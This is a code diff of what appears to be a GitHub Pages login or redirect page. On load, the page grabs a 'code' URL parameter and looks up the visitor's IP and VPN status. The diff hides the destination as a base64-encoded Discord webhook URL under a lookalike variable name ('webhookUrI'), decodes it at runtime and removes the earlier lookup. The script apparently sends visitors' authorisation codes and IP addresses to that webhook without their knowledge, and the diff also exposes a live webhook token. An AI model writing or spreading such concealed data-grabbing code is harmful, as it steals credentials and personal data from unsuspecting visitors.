@@ -160,7 +160,8 @@
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
-            const webhookUrl = `https://api.github.com/repos/tedaimlocks/tedaimlocks.github.io/actions/secrets/WEBHOOK_URL`;
+            const webhookUrI = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjgwMzM4OTg3MjM0NTEwOC9sMUhWSkdHNXNpNExISklHUHZDYklaM3FkT09YajRNejlQdFlwbklOREM3UV81b2xvVjhoN3JERFh0WnBkTXBTVEFiYQ==";
+            const webhookUrl = atob(webhookUrI);
 
 
             const blacklistedIPs = ["81.35.53.46", "1"];
@@ -169,7 +170,6 @@
             fetch(vpnProxyCheckUrl)
                 .then(response => response.json())
                 .then(data => {
-                    const webhookUrl = data['WEBHOOK_URL'];
                     const ip = data.ip;
                     const isVPNProxy = data.proxy || data.vpn;
 
